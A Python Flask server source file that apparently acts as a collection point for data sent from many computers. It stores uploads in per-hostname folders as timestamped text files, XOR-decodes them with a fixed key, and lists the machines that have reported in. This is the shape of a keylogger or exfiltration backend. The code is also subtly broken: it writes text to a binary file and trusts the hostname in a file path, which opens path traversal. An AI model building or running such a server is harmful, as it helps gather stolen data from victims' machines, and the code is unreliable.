import os
import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

UPLOAD_FOLDER = "uploads"
KEY = 5
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


def xor_decrypt(data):
    return ''.join(chr(ord(c) ^ KEY) for c in data)


@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files or 'hostname' not in request.form:
        return jsonify({"error": "Missing file or hostname"}), 400

    file = request.files['file']
    hostname = request.form['hostname']

    computer_folder = os.path.join(UPLOAD_FOLDER, hostname)
    os.makedirs(computer_folder, exist_ok=True)

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_path = os.path.join(computer_folder, f"{timestamp}.txt")

    if os.path.exists(file_path):
        with open(file_path, "ab") as f:
            f.write(xor_decrypt(file.read().decode("utf-8")))
    else:
        file.save(file_path)

    print(jsonify({"message": "File received", "path": file_path}))

    return jsonify({"message": "File received", "path": file_path}), 200


@app.route('/computers', methods=['GET'])
def list_computers():
    computers = [d for d in os.listdir(UPLOAD_FOLDER) if os.path.isdir(os.path.join(UPLOAD_FOLDER, d))]
    return jsonify({"computers": computers})


if __name__ == '__main__':
    print('server is listening on port 5000')
    app.run(host='0.0.0.0', port=5000)
